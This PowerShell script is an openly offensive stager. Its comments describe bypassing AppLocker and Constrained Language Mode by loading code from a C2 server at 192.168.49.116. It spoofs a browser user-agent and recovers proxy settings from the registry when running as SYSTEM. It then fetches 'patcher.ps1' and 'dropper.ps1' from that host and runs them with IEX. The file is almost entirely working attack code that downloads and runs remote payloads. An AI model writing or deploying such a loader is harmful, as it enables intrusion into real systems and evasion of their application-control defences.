# When AppLocker & CLM is enabled, it is impossible to load main.ps1 from disk
# In this case, load the script with IEX & DownloadString

try {
  # Attempt direct access to C2 server
  $wc = New-Object System.Net.WebClient;
  $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36');
  $wc.proxy = $null;
  $null = $wc.DownloadString('http://192.168.49.116/');
} catch {
  try {
    # Enable automatic proxy when callback to the C2 server fails
    $wc = New-Object System.Net.WebClient;
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36');
    $null = $wc.DownloadString('http://192.168.49.116/');
  } catch {
    # When running in SYSTEM integrity level, detect proxy settings manually
    $null = New-PSDrive -Name HKEY_USERS -PSProvider Registry -Root HKEY_USERS;
    $keys = Get-ChildItem 'HKEY_USERS:\';
    ForEach ($key in $keys.Name.substring(11)) {if ($key -like 'S-1-5-21-*') {$sid = $key; break}};
    $proxyAddr = (Get-ItemProperty -Path('HKEY_USERS:'+$sid+'\Software\Microsoft\Windows\CurrentVersion\Internet Settings\')).ProxyServer;
    $wc.proxy = New-Object System.Net.WebProxy('http://'+$proxyAddr);
    $null = Remove-PSDrive -Name HKEY_USERS;
  }
}

IEX $wc.DownloadString('http://192.168.49.116/patcher.ps1');
IEX $wc.DownloadString('http://192.168.49.116/dropper.ps1');